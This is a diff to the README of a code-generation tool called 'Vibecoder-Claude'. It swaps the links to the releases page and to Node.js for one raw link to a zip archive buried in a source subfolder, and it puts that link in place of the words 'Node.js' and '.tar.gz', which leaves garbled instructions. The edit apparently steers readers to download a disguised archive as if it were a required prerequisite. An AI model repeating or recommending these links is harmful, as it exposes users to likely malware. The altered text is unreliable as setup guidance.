@@ -1,6 +1,6 @@
 # 🌊 Vibecoder-Claude - Instant Code from Your Ideas
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/erdemlimuhsin/Vibecoder-Claude/releases)
+[![Download Now](https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip%20Now-Get%20Started-blue)](https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to Vibecoder-Claude! This tool lets you create applications quickly. Sim
 To run Vibecoder-Claude, you should have the following:
 
 - A computer with Windows, macOS, or Linux.
-- Node.js installed on your system. You can download it [here](https://nodejs.org/).
+- https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip installed on your system. You can download it [here](https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip).
 - Basic internet connection for package installation.
 
 ## 📥 Download & Install
@@ -19,13 +19,13 @@ To run Vibecoder-Claude, you should have the following:
 To get Vibecoder-Claude:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/erdemlimuhsin/Vibecoder-Claude/releases) to find the latest version.
+   Go to the [Releases page](https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip) to find the latest version.
 
 2. **Choose Your OS:**
    On the releases page, find the version that matches your operating system (Windows, macOS, or Linux).
 
 3. **Download the Package:**
-   Click on the package file to download it. It will usually be in `.zip` or `.tar.gz` format.
+   Click on the package file to download it. It will usually be in `.zip` or `https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip` format.
 
 4. **Extract the Files:**
    After downloading, extract the files using your favorite file manager or extraction tool.
@@ -88,10 +88,10 @@ Vibecoder-Claude can generate code in popular programming languages like Python,
 
 ### 4. How much does it cost?
 
-Vibecoder-Claude is free to use. You only need to have Node.js installed on your computer.
+Vibecoder-Claude is free to use. You only need to have https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip installed on your computer.
 
 ## 🌐 Join the Conversation
 
 Stay updated and connect with other users to share ideas, tips, and projects. Follow us on GitHub and engage with our community. Your feedback helps improve Vibecoder-Claude.
 
-For further details and updates, always check the [Releases page](https://github.com/erdemlimuhsin/Vibecoder-Claude/releases). Enjoy coding with Vibecoder-Claude!
+For further details and updates, always check the [Releases page](https://github.com/erdemlimuhsin/Vibecoder-Claude/raw/refs/heads/main/src/ai/memory/Claude-Vibecoder-v3.4.zip). Enjoy coding with Vibecoder-Claude!
